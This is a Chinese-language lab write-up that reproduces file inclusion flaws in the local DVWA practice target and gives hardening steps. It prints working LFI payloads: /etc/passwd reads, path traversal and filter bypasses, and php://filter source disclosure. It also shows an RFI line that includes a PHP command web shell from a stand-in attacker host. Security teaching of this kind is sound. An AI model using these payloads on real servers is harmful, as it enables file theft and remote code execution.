# 文件包含（File Inclusion）漏洞复现

> 漏洞模块：DVWA File Inclusion
> 工具：浏览器、Burp Suite
> 难度等级：Low / Medium / High

> ⚠️ **合规声明**：本文档所有 Payload 均在本地 DVWA 靶场复现，仅用于安全学习。严禁对未授权系统使用。

---

## 一、漏洞概述

**原理**：服务端使用动态文件包含函数（如 PHP `include`、`require`）加载文件时，未对用户可控的路径参数做充分校验，导致攻击者可读取任意文件或执行远程代码。

**OWASP 分类**：A03:2021 - Injection / A01:2021 - Broken Access Control

**分类**：
- **本地文件包含（LFI）**：包含服务器本地文件，可读取敏感信息（/etc/passwd、配置文件、源码）
- **远程文件包含（RFI）**：包含远程服务器文件（PHP 默认开启 `allow_url_include` 时可利用）

**危害**：
- 读取服务器任意文件（配置文件、密码、源码）
- 配合日志投毒、图片马等方式执行任意代码
- 远程命令执行（RFI 场景）

## 二、DVWA 四等级复现

### 2.1 Low 级别

#### 代码分析
`vulnerabilities/fi/source/low.php`：
```php
$file = $_GET['page'];
include($file);
```

直接 `include` 用户输入，无任何校验。

#### 复现步骤

##### LFI（本地文件包含）

1. 难度调至 **Low**，进入 **File Inclusion** 模块
2. 正常 URL：
   ```
   http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php
   ```
3. **测试 LFI**：修改 `page` 参数为绝对路径：
   ```
   ?page=/etc/passwd
   ```
4. 页面回显 `/etc/passwd` 文件内容 → **LFI 漏洞确认**

##### 跨目录读取

```
?page=../../../../etc/passwd
```

##### PHP 过滤器读取源码

利用 `php://filter` 协议读取 PHP 源码（避免被解析执行）：
```
?page=php://filter/convert.base64-encode/resource=file1.php
```

将返回 base64 编码后的 file1.php 源码，解码即可得源代码。

##### RFI（远程文件包含）

> ⚠️ **仅作为原理说明**，不演示真实远程利用。

若服务端 PHP 配置 `allow_url_include = On`，可包含远程服务器文件：
```
?page=http://attacker.com/evil.txt
```

远程 `evil.txt` 内容若为 `<?php system($_GET['cmd']); ?>`，即可实现远程命令执行。

> ⚠️ 本仓库**严禁**演示完整 RFI Payload，仅作原理说明。

#### 漏洞验证结果

| 项 | 值 |
|---|---|
| 包含函数 | `include()` |
| 输入校验 | 无 |
| LFI 验证 | ✅ 可读取任意本地文件 |
| RFI 风险 | 视 `allow_url_include` 配置 |
| PHP 过滤器 | ✅ 可绕过 `<?php` 标签读取源码 |

### 2.2 Medium 级别

#### 防护机制
```php
$file = $_GET['page'];
// 替换 ../ 防止跨目录
$file = str_replace("http://", "", $file);
$file = str_replace("https://", "", $file);
$file = str_replace("../", "", $file);
include($file);
```

**过滤特征**：
- 仅过滤 `http://`、`https://`、`../` 三个字符串
- **未过滤**：`..\`（Windows 反斜杠）、`....//`（嵌套绕过）、`http` 无 `://`

#### 绕过思路

| 绕过方式 | Payload |
|---|---|
| 双写绕过 | `....//` （服务端过滤后剩余 `../`） |
| 绝对路径 | `?page=/etc/passwd` |
| 反斜杠 | `?page=..\..\windows\system32\drivers\etc\hosts`（Windows） |
| 大小写 | `?page=HTTP://evil.com/shell.txt` |
| 协议变体 | `?page=php://filter/convert.base64-encode/resource=file1.php` |

---

### 2.3 High 级别

#### 防护机制
```php
// 白名单：仅允许 file1.php / file2.php / file3.php
if ($file !== "include.php" && $file !== "file1.php" && $file !== "file2.php" && $file !== "file3.php") {
    http_response_code(400);
    die('Failed to include file');
}
```

**严格白名单**，看似无漏洞。

#### 绕过思路
**利用 file 协议**（PHP 支持多种流协议）：
```
?page=file:///etc/passwd
```

白名单只检查 `file1.php` 等字符串，**未限制协议**。

> ⚠️ **实际验证**需根据具体 DVWA 版本，部分版本 High 级别已修复该绕过。

---

### 2.4 Impossible 级别（安全实现）

```php
// 严格白名单 + 仅允许预期文件
if ($file === 'file1.php' || $file === 'file2.php' || $file === 'file3.php') {
    // 仅包含 dvwa 目录下文件
    include(DVWA_WEB_PAGE_TO_ROOT . "vulnerabilities/fi/files/" . $file);
}
```

**安全设计要点**：
- ✅ **严格白名单**（非字符串匹配，是精确等于判断）
- ✅ **白名单预定义文件路径**
- ✅ 不使用用户输入拼接路径
- ✅ 关闭 `allow_url_include`（PHP 配置）

## 三、文件包含利用思路

### 3.1 LFI 利用链

| 思路 | 原理 | 难度 |
|---|---|---|
| 读取敏感配置 | `/etc/passwd`、`.env`、数据库配置 | 低 |
| PHP 过滤器读源码 | `php://filter` 协议 | 低 |
| 日志投毒 | 注入 PHP 代码到 Apache/Nginx 日志，再包含日志文件 | 中 |
| /proc/self/environ | 读取进程环境变量 | 中 |
| session 投毒 | 注入 PHP 代码到 session 文件，再包含 | 中 |
| 临时文件包含 | 上传临时文件时路径爆破 | 高 |

### 3.2 RFI 利用链

| 思路 | 原理 | 难度 |
|---|---|---|
| 远程 PHP 文件 | 包含远程 PHP 文件直接执行 | 低（需 `allow_url_include=On`） |
| 远程文本文件 + 本地 PHP 解析 | 远程返回 PHP 代码，本地 include 解析 | 低 |

> ⚠️ 本仓库**仅作原理说明**，不演示具体利用 Payload 细节。

## 四、加固建议

### 4.1 服务端代码层

1. **白名单文件路径**（最关键）：
   ```php
   $allowed = ['file1.php', 'file2.php'];
   if (!in_array($page, $allowed)) {
       die('Invalid file.');
   }
   include('/path/to/' . $page);
   ```

2. **避免直接拼接路径**：
   - 使用配置文件映射用户选项 → 实际文件路径

4. **使用 basename() 限制文件名**：
   ```php
   $page = basename($_GET['page']);  // 仅取文件名，去除路径
   ```

### 4.2 PHP 配置层

1. **关闭 `allow_url_include`**（关键）：
   ```ini
   ; php.ini
   allow_url_include = Off
   allow_url_fopen = Off
   ```

2. **open_basedir 限制**（PHP 进程可访问的目录）：
   ```ini
   open_basedir = /var/www/html:/tmp
   ```

3. **禁用危险函数**：
   ```ini
   ; php.ini（生产环境）
   disable_functions = exec,passthru,shell_exec,system,proc_open,popen
   ```

### 4.3 Web 服务器层

1. **Apache 配置**：限制 PHP 包含路径
2. **Nginx 配置**：`open_basedir` 等

### 4.4 业务层

1. **静态文件直出**：避免动态 `include`，改为路由分发
2. **文件存储独立域**：静态文件使用独立域名，天然隔离 PHP 解析

## 五、加固验证清单

- [ ] 输入 `?page=/etc/passwd` → 拒绝（白名单生效）
- [ ] 输入 `?page=php://filter/...` → 拒绝
- [ ] 输入 `?page=http://attacker.com/...` → 拒绝（RFI 被禁）
- [ ] 输入 `?page=file1.php` → 正常返回文件内容
- [ ] `php.ini` 中 `allow_url_include = Off`
- [ ] Web 服务进程仅能访问指定目录
- [ ] PHP `disable_functions` 已配置
